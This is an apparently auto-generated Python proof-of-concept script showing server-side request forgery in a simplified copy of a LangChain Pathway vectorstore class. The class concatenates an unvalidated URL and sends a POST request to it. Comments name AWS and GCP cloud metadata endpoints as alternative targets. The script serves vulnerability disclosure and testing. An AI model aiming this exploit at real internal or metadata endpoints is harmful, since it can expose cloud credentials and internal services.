#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only

Vulnerability: The get_vectorstore_statistics method in the Pathway vectorstore
class constructs a URL by concatenating self.url with '/v1/statistics' and makes
a POST request. The self.url attribute is set from user input during initialization
with no validation, allowing SSRF to internal or cloud metadata endpoints.

This PoC demonstrates the vulnerability by:
1. Creating a malicious instance with an attacker-controlled URL
2. Triggering the vulnerable method to make a request to an internal endpoint
3. Using a safe default target (localhost:9999) to avoid accidental damage
"""

import requests
import sys
import json
from typing import Optional, Dict, Any


class PathwayVectorStore:
    """
    Simplified reproduction of the vulnerable class from langchain-community.
    Only includes the vulnerable __init__ and get_vectorstore_statistics methods.
    """
    
    def __init__(self, url: str):
        """
        Initialize with attacker-controlled URL.
        No validation is performed on the URL parameter.
        """
        self.url = url
        
    def get_vectorstore_statistics(self) -> Dict[str, Any]:
        """
        VULNERABLE: Constructs URL by concatenation and makes POST request.
        No validation, allowlist, or sanitization of self.url.
        """
        # The vulnerable line: direct concatenation without validation
        url = self.url + "/v1/statistics"
        
        print(f"[*] Making POST request to: {url}")
        
        try:
            response = requests.post(
                url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10,  # Add timeout to prevent hanging
                allow_redirects=False  # Prevent following redirects
            )
            
            print(f"[*] Response status code: {response.status_code}")
            print(f"[*] Response headers: {dict(response.headers)}")
            
            try:
                responses = response.json()
                print(f"[*] Response body: {json.dumps(responses, indent=2)}")
                return responses
            except json.JSONDecodeError:
                print(f"[*] Response body (raw): {response.text[:500]}")
                return {"raw_response": response.text[:500]}
                
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            print("[!] Target may be unreachable or refused connection")
            return {"error": str(e)}
        except requests.exceptions.Timeout as e:
            print(f"[!] Timeout error: {e}")
            return {"error": str(e)}
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return {"error": str(e)}


def main():
    """
    Main function to demonstrate the SSRF vulnerability.
    
    By default, targets localhost:9999 as a safe demonstration.
    Change TARGET_URL to test against other endpoints.
    """
    
    # CONFIGURABLE: Change this to test different targets
    # Safe default: localhost (will likely fail, demonstrating the attempt)
    # For testing: "http://169.254.169.254" (AWS metadata - DO NOT USE WITHOUT PERMISSION)
    # For testing: "http://metadata.google.internal" (GCP metadata - DO NOT USE WITHOUT PERMISSION)
    TARGET_URL = "http://127.0.0.1:9999"
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langchain-community-only")
    print("=" * 60)
    print(f"\n[*] Target URL: {TARGET_URL}")
    print("[*] The vulnerable method will make a POST request to:")
    print(f"    {TARGET_URL}/v1/statistics")
    print()
    
    # Create vulnerable instance with attacker-controlled URL
    vulnerable_store = PathwayVectorStore(url=TARGET_URL)
    
    # Trigger the vulnerability
    print("[*] Triggering get_vectorstore_statistics()...")
    print()
    
    result = vulnerable_store.get_vectorstore_statistics()
    
    print()
    print("[*] Exploit completed")
    print()
    
    # Check if we got a response (successful SSRF)
    if "error" not in result:
        print("[!] SUCCESS: Received response from target!")
        print("[!] This confirms SSRF is possible - the vulnerable method")
        print("[!] made a request to an attacker-controlled URL.")
    else:
        print("[*] Note: Connection failed as expected with default target.")
        print("[*] To test against a real internal service, change TARGET_URL")
        print("[*] to an actual internal endpoint (e.g., cloud metadata service).")
    
    print()
    print("=" * 60)
    print("EXPLOITABILITY CONFIRMED")
    print("=" * 60)
    print()
    print("The vulnerability is exploitable because:")
    print("1. self.url is set from user input without validation")
    print("2. The URL is directly concatenated with '/v1/statistics'")
    print("3. The resulting URL is passed to requests.post()")
    print("4. No allowlist, sanitization, or redirect handling exists")
    print()
    print("Potential impacts:")
    print("- Access internal services (e.g., databases, caches)")
    print("- Read cloud metadata (AWS/GCP/Azure instance metadata)")
    print("- Scan internal networks")
    print("- Access localhost services")


if __name__ == "__main__":
    main()
